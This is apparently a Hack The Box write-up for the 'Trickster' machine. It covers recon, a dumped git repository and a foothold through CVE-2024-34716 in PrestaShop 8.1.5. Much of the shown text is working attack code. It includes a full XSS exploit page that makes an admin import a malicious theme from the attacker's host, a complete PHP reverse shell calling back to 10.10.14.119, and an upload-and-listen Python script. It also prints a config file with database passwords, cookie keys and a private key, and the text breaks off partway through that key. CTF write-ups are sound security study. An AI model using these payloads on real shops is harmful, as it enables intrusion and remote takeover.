---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - PrestaShop
  - CMS
  - Git
  - CVE-2024-34716
  - CrossSiteScripting
  - XSS
  - MariaDB
  - Hash
  - Cracking
  - JohnTheRipper
  - Container
  - CHANGEDETECTIONIO
  - PasswordReuse
  - ServerSideTemplateInjection
  - SSTI
  - Jinja2
  - brotli
  - PrusaSlicer
  - CVE-2023-47268
  - ArbitraryCodeExecution
---

![](images/Trickster.png)

## Summary

On port `80/TCP` a `Shop` button leads to the `VHOST` of `shop.trickster.htb` which runs an application called `PrestaShop`. This can be verified by downloading the `Git repository` which shows up during `Directory Busting`. The configuration files contain a `custom URL` to lead you to the exact `version` of `PrestaShop` and to the `CVE-2024-34716`. The vulnerability allows `Remote Code Execution (RCE)` through `Cross-Site Scripting (XSS)`. My modifying an already available `Proof of Concept (PoC)` exploit `foothold` as `www-data` can be achieved. By doing enumeration of the files inside the `app directory` a set of `credentials` for the `MariaDB` can be found. The `hash` for a user called `james` can be extracted out of the `database`. After `cracking` the `hash` the `user.txt` can be obtained. Next step is to find a running `container` which provides the application `CHANGEDETECTION.IO`. To access the application port `5000/TCP` needs to be `forwarded`. By `re-using` the `password` of `james` access to the application is granted. From there on `Server-Side Template Injection (SSTI)` leads to `Arbitrary Code Execution` and to a `reverse shell` as `root` inside the `container`. To `escalate the privileges` to the next user which is called `adam` some `backup files` inside a `datastore folder` of `/` are needed to be extracted to find the `password` of `adam`. The user `adam` has the capability to execute a `prusaslicer` binary using `sudo`. The `CVE-2023-47268` allows `Arbitrary Code Execution` through a modified `.3mf` file by using the `post_process` configuration in version `2.6.1`. To do so the line inside the `Slic3r_PE.config` can be edited to execute whatever `payload` is desired. After `elevating privileges` to `root` grab the `root.txt` and close the box.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Taking a look at the shop](#Taking-a-look-at-the-shop)
- [Directory Busting](#Directory-Busting)
- [Dumping the Git Repository](#Dumping-the-Git-Repository)
- [Foothold](#Foothold)
    - [CVE-2024-34716: PrestaShop XSS to Remote Code Execution (RCE)](#CVE-2024-34716-PrestaShop-XSS-to-Remote-Code-Execution-RCE)
- [Enumeration](#Enumeration)
- [Privilege Escalation to james](#Privilege-Escalation-to-james)
    - [Database Enumeration](#Database-Enumeration)
    - [Cracking the Hash](#Cracking-the-Hash)
- [user.txt](#usertxt)
- [Pivoting (james)](#Pivoting-(james))
- [Enumerating the containerized Application](#Enumerating-the-containerized-Application)
- [Server-Side Template Injection (SSTI)](#Server-Side-Template-Injection-SSTI)
- [Privilege Escalation to root (unintended)](#Privilege-Escalation-to-root-unintended)
- [Privilege Escalation to adam](#Privilege-Escalation-to-adam)
- [Pivoting (adam)](#Pivoting-(adam))
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [CVE-2023-47268: PrusaSlicer 2.6.1 Arbitrary Code Execution](#CVE-2023-47268-PrusaSlicer-261-Arbitrary-Code-Execution)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

As always we started with a basic `port scan` which only showed port `22/TCP` and port `80/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.188.199
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 21:02 CEST
Nmap scan report for 10.129.188.199
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.73 seconds
```

### Enumeration of Port 80/TCP

We accessed port `80/TCP` using the `IP address` and got redirected to `http://trickster.htb/` which we then added to our `/etc/hosts` file.

- [http://10.129.188.199/](http://10.129.188.199/)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.188.199  trickster.htb
```

- [http://trickster.htb/](http://trickster.htb/)

The `web stack` didn't showed anything out of the ordinary.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://trickster.htb/ 
http://trickster.htb/ [403 Forbidden] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.188.199], Title[403 Forbidden]
```

On the `website` itself we found a `link` to `http://shop.trickster.htb/` behind the `shop button`.

![](images/2024-09-21_21-05_80_website.png)

## Taking a look at the shop

We added the newly found `VHOST` to our `/etc/hosts` file and started having a look at it as well.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.188.199  trickster.htb
10.129.188.199  shop.trickster.htb
```

- [http://shop.trickster.htb/](http://shop.trickster.htb/)

As expected we found ourselves on a `store page` for various goods with the option to `sign in`.

![](images/2024-09-21_21-07_80_trickster_store.png)

To login we needed to create an account. We created one and started looking around. Unfortunately this didn't lead us to anything useful.

![](images/2024-09-21_21-10_80_trickster_store_account_creation.png)

## Directory Busting

We started `Directory Busting` on the `shop` and found a `Git repository`.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://shop.trickster.htb/

  _|. _ _  _  _  _ _|_    v0.4.3                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_shop.trickster.htb/__24-09-21_21-11-58.txt

Target: http://shop.trickster.htb/

[21:11:58] Starting:                                                                                                                                                                                                                        
[21:12:00] 403 -  283B  - /php.bak                                          
[21:12:00] 403 -  283B  - /html.bak
[21:12:00] 403 -  283B  - /aspx.old
<--- CUT FOR BREVITY --->
[21:14:50] 301 -  323B  - /.git  ->  http://shop.trickster.htb/.git/        
[21:15:04] 200 -   20B  - /.git/COMMIT_EDITMSG                              
[21:15:07] 200 -  413B  - /.git/branches/                                   
[21:15:07] 200 -   73B  - /.git/description
[21:15:07] 200 -   28B  - /.git/HEAD                                        
[21:15:12] 200 -  112B  - /.git/config                                      
[21:15:12] 200 -  246KB - /.git/index
[21:15:14] 301 -  333B  - /.git/logs/refs  ->  http://shop.trickster.htb/.git/logs/refs/
[21:15:15] 301 -  339B  - /.git/logs/refs/heads  ->  http://shop.trickster.htb/.git/logs/refs/heads/
[21:15:15] 200 -  240B  - /.git/info/exclude
[21:15:18] 301 -  334B  - /.git/refs/heads  ->  http://shop.trickster.htb/.git/refs/heads/
[21:15:20] 200 -  163B  - /.git/logs/HEAD                                   
[21:15:20] 200 -  460B  - /.git/info/
[21:15:20] 200 -  613B  - /.git/                                            
[21:15:23] 301 -  333B  - /.git/refs/tags  ->  http://shop.trickster.htb/.git/refs/tags/
[21:15:23] 200 -  491B  - /.git/logs/
[21:15:28] 200 -  462B  - /.git/refs/                                       
[21:15:33] 200 -  694B  - /.git/hooks/
<--- CUT FOR BREVITY --->
```

## Dumping the Git Repository

With the use of `git-dumper` we were able to download the `repository`.

- [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)

```c
┌──(kali㉿kali)-[~/opt/01_information_gathering/git-dumper]
└─$ python3 git_dumper.py http://shop.trickster.htb ./trickster
[-] Testing http://shop.trickster.htb/.git/HEAD [200]
[-] Testing http://shop.trickster.htb/.git/ [200]
[-] Fetching .git recursively
<--- CUT FOR BREVITY --->
```

First we found was the `username` inside the `.git/config` file.

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/dump]
└─$ cat .git/config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = adam
```

| Username |
| -------- |
| adam     |

Then we started investigating the other files.

```c
┌──(kali㉿kali)-[/media/…/Trickster/files/trickster/admin634ewutrx1jgitlooaj]
└─$ ls -la
total 100
drwxrwx--- 1 root vboxsf   378 Sep 21 21:26 .
drwxrwx--- 1 root vboxsf   200 Sep 21 21:26 ..
-rwxrwx--- 1 root vboxsf  3611 Sep 21 21:26 .htaccess
drwxrwx--- 1 root vboxsf    30 Sep 21 21:26 autoupgrade
drwxrwx--- 1 root vboxsf    36 Sep 21 21:26 backups
-rwxrwx--- 1 root vboxsf  1291 Sep 21 21:26 bootstrap.php
-rwxrwx--- 1 root vboxsf  1579 Sep 21 21:26 cron_currency_rates.php
drwxrwx--- 1 root vboxsf    36 Sep 21 21:26 export
-rwxrwx--- 1 root vboxsf 34494 Sep 21 21:26 favicon.ico
drwxrwx--- 1 root vboxsf   282 Sep 21 21:26 filemanager
-rwxrwx--- 1 root vboxsf  1590 Sep 21 21:26 footer.inc.php
-rwxrwx--- 1 root vboxsf 22741 Sep 21 21:26 functions.php
-rwxrwx--- 1 root vboxsf  1613 Sep 21 21:26 get-file-admin.php
-rwxrwx--- 1 root vboxsf  2751 Sep 21 21:26 header.inc.php
drwxrwx--- 1 root vboxsf    36 Sep 21 21:26 import
-rwxrwx--- 1 root vboxsf  3569 Sep 21 21:26 index.php
-rwxrwx--- 1 root vboxsf  5784 Sep 21 21:26 init.php
-rwxrwx--- 1 root vboxsf   118 Sep 21 21:26 robots.txt
drwxrwx--- 1 root vboxsf    50 Sep 21 21:26 themes
```

## Foothold

### CVE-2024-34716: PrestaShop XSS to Remote Code Execution (RCE)

We found the following `URL` inside the `Git dump` and got access to the `login page`  of the `PrestaShop` application. Luckily for us it showed the version which was in use.

- [http://shop.trickster.htb/admin634ewutrx1jgitlooaj/index.php?controller=AdminLogin&token=be9a5cdf914b6e841e76eaf7f3c4e5af](http://shop.trickster.htb/admin634ewutrx1jgitlooaj/index.php?controller=AdminLogin&token=be9a5cdf914b6e841e76eaf7f3c4e5af)

![](images/2024-09-21_21-36_80_trickster_store_controller.png)

| Version |
| ------- |
| 8.1.5   |

The version of `PrestaShop` was vulnerable to `CVE-2024-34716` which ended up in `Remote Code Execution (RCE)`. There was also a publicly available `Proof of Concept (PoC)` exploit.

- [https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/)
- [https://github.com/aelmokhtar/CVE-2024-34716](https://github.com/aelmokhtar/CVE-2024-34716)

We needed to make some modifications to the `exploit.html` in order to make it work.

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/CVE-2024-34716_PoC]
└─$ cat exploit.html 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta viewport="width=device-width, initial-scale=1.0">
    <title>Exploit</title>
</head>
<body>
    <script>
        async function fetchTokenFromHTML() {
            const url = 'http://shop.trickster.htb/admin634ewutrx1jgitlooaj/index.php/improve/design/themes/import';
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for token extraction. Status: ' + response.status);
                
                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");
                
                const anchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
                const href = anchor ? anchor.getAttribute('href') : null;
                const match = href ? href.match(/_token=([^&]+)/) : null;
                const token = match ? match[1] : null;
                if (!token) throw new Error('Token not found in anchor tag href.');
                
                console.log('Extracted Token from HTML:', token);
                return token;
            } catch (error) {
                console.error('Error fetching token from HTML content:', error);
                return null;
            }
        }

        async function fetchCSRFToken(token) {
            const csrfUrl = `http://shop.trickster.htb/admin634ewutrx1jgitlooaj/index.php/improve/design/themes/import?_token=${token}`;
            try {
                const response = await fetch(csrfUrl, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for CSRF token extraction. Status: ' + response.status);
                
                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");
                
                const csrfTokenInput = doc.querySelector('input[name="import_theme[_token]"]');
                const csrfToken = csrfTokenInput ? csrfTokenInput.value : null;
                if (!csrfToken) throw new Error('CSRF token not found in HTML content.');
                
                console.log('Extracted CSRF Token:', csrfToken);
                return csrfToken;
            } catch (error) {
                console.error('Error fetching CSRF token:', error);
                return null;
            }
        }

        async function importTheme() {
            try {
                const locationHeaderToken = await fetchTokenFromHTML();
                if (!locationHeaderToken) {
                    console.error('Failed to fetch token from HTML');
                    return;
                }

                const csrfToken = await fetchCSRFToken(locationHeaderToken);
                if (!csrfToken) {
                    console.error('Failed to fetch CSRF token');
                    return;
                }

                const formData = new FormData();
                formData.append('import_theme[import_from_web]', 'http://10.10.14.119/ps_next_8_theme_malicious.zip');
                formData.append('import_theme[_token]', csrfToken);

                const postUrl = `/admin634ewutrx1jgitlooaj/index.php/improve/design/themes/import?_token=${locationHeaderToken}`;
                console.log('POST URL:', postUrl);

                const response = await fetch(postUrl, {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    console.log('Theme imported successfully');
                } else {
                    console.error('Failed to import theme. Response Status:', response.status);
                }
            } catch (error) {
                console.error('Error importing theme:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            importTheme();
        });
    </script>
</body>
</html>
```

We also updated the `IP address` and `port` for the `reverse shell` in the `a.php` file to point back to our local machine.

```c
┌──(kali㉿kali)-[~/Downloads/ps_next_8_theme_malicious]
└─$ cat a.php 
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.119';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

As last step we modified the `exploit.py` itself to work in a more convenient way.

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/CVE-2024-34716_PoC]
└─$ cat exploit.py 
import requests, subprocess, time, threading
from bs4 import BeautifulSoup

def send_get_requests(url, interval=5):
    while True:
        try:
            response = requests.get(url)
            print(f"GET request to {url}: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error during GET request: {e}")
        time.sleep(interval)


host_url = 'http://shop.trickster.htb'
email = 'foobar@foobar.local'
message_content = 'asdf'
exploit_path = 'exploit.html'

with open(exploit_path, 'r') as file:
    html_content = file.read()

url = f"{host_url}/contact-us"

response = requests.get(url)
response.raise_for_status()

soup = BeautifulSoup(response.text, 'html.parser')
token = soup.find('input', {'name': 'token'})['value']
cookies = response.cookies

files = {
    'fileUpload': ('test.png', html_content, 'image/png'),
}

data = {
    'id_contact': '2',
    'from': email,
    'message': message_content,
    'url': '',
    'token': token,
    'submitMessage': 'Send'
}

response = requests.post(url, files=files, data=data, cookies=cookies)


def send_get_requests(interval=1):
    url = f"{host_url}/themes/next/a.php"
    while True:
        try:
            requests.get(url)
        except requests.RequestException as e:
            print(f"Error during GET request: {e}")
        time.sleep(interval)

thread = threading.Thread(target=send_get_requests)
thread.daemon = True
thread.start()

if response.status_code == 200:
    print(f"[X] Yay! Your exploit was sent successfully!")
    print(f"[X] Once a CS agent clicks on attachement, you'll get a SHELL")
    
    subprocess.call(["ncat", "-lnvp", "1234"], shell=False)
    print("[X] ncat is now listening on port 1234. Press Ctrl+C to terminate.")

else:
    print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")
```

After we've finished the modifications we re-created the `ps_next_8_theme_malicious.zip` file.

```c
┌──(kali㉿kali)-[/media/…/Trickster/files/CVE-2024-34716_PoC/ps_next_8_theme_malicious]
└─$ zip -r ps_next_8_theme_malicious.zip ./
<--- CUT FOR BREVITY --->
```

As next step we started a `Python web server` to host the `.zip` file.

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/CVE-2024-34716_PoC]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.188.199 - - [21/Sep/2024 23:15:44] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
```

And after we fired up the `exploit.py` we received a `callback` after a few seconds of waiting.

```c
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/CVE-2024-34716_PoC]
└─$ python3 exploit.py
[X] Yay! Your exploit was sent successfully!
[X] Once a CS agent clicks on attachement, you'll get a SHELL
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.188.199:58748.
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 21:36:24 up 25 min,  0 users,  load average: 0.23, 0.16, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

```c
www-data@trickster:/$ ^Z
zsh: suspended  python3 exploit.py
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/media/…/Machines/Trickster/files/CVE-2024-34716_PoC]
└─$ stty raw -echo;fg
[1]  + continued  python3 exploit.py

www-data@trickster:/$ 
www-data@trickster:/$
www-data@trickster:/$ export XTERM=xterm
www-data@trickster:/$
```

## Enumeration

We got a `reverse shell` as `www-data` and started with our `enumeration`.

```c
www-data@trickster:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

By checking the `/etc/passwd` we found three additional `usernames`.

```c
www-data@trickster:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
james:x:1000:1000:trickster:/home/james:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
adam:x:1002:1002::/home/adam:/bin/bash
dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
runner:x:1003:1003::/home/runner:/bin/sh
_laurel:x:998:998::/var/log/laurel:/bin/false
postfix:x:116:123::/var/spool/postfix:/usr/sbin/nologin
```

| Username |
| -------- |
| james    |
| adam     |
| runner   |

Inside the `config` folder we had a look at the `parameter.php` file which contained `credentials` for the `database`.

```c
www-data@trickster:~/prestashop/app/config$ cat parameters.php
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
    'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
    'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03f4040bd5e8cb44bdb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47',
    'api_public_key' => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
Scu6QqRAdotokqW2m3aMt+LV8ERdFsBkj+/OVdJ8oslvSt6Kgf39DnBpGIXAqaFc
QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
ZQIDAQAB
-----END PUBLIC KEY-----
',
    'api_private_key' => '-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5IVA/fGtlxwpt
L9UYoyu/x0XggmH0X02+Y9mqIU2kmcEeF9YTdhUz86sREQYrO2QcWxAZRlcUjCIF
BWzmQAbmN/D6FCuXz34lEPSiBn44dR838KCYzZ6rUf+DEBh9xF/CNKU6HZjMDCku
/C1hcG1Jy7pCpEB2i2iSpbabdoy34tXwRF0WwGSP785V0nyiyW9K3oqB/f0OcGkY
hcCpoVxB0x2r7WVP2iJvLR7HJSSXpolTbVJMVnuQJ/RJ5ynZ/02hoqgHAL2bvTsL
ZQI2QCYHYDbDF/zwEMLsK3BrPANb1Bd0X3ztFTMaP1SsRbBPBgRwlxX+E0Hjvdtz
K1om9jVlAgMBAAECggEAD5CTdKL7TJVNdRyeZ/HgDcGtSFDt92PD34v5kuo14u7i
Y6tRXlWBNtr3uPmbcSsPIasuUVGupJWbjpyEKV+ctOJjKkNj3uGdE3S3fJ/bINgI
BeX/OpmfC3xbZSOHS5ulCWjvs1EltZIYLFEbZ6PSLHAqesvgd5cE9b9k+PEgp50Q
DivaH4PxfI7IKLlcWiq2mBrYwsWHIlcaN0Ys7h0RYn7OjhrPr8V/LyJLIlapBeQV
Geq6MswRO6OXfLs4Rzuw17S9nQ0PDi4OqsG6I2tm4Puq4kB5CzqQ8WfsMiz6zFU/
UIHnnv9jrqfHGYoq9g5rQWKyjxMTlKA8PnMiKzssiQKBgQDeamSzzG6fdtSlK8zC
TXHpssVQjbw9aIQYX6YaiApvsi8a6V5E8IesHqDnS+s+9vjrHew4rZ6Uy0uV9p2P
MAi3gd1Gl9mBQd36Dp53AWik29cxKPdvj92ZBiygtRgTyxWHQ7E6WwxeNUWwMR/i
4XoaSFyWK7v5Aoa59ECduzJm1wKBgQDVFaDVFgBS36r4fvmw4JUYAEo/u6do3Xq9
JQRALrEO9mdIsBjYs9N8gte/9FAijxCIprDzFFhgUxYFSoUexyRkt7fAsFpuSRgs
+Ksu4bKxkIQaa5pn2WNh1rdHq06KryC0iLbNii6eiHMyIDYKX9KpByaGDtmfrsRs
uxD9umhKIwKBgECAXl/+Q36feZ/FCga3ave5TpvD3vl4HAbthkBff5dQ93Q4hYw8
rTvvTf6F9900xo95CA6P21OPeYYuFRd3eK+vS7qzQvLHZValcrNUh0J4NvocxVVn
RX6hWcPpgOgMl1u49+bSjM2taV5lgLfNaBnDLoamfEcEwomfGjYkGcPVAoGBAILy
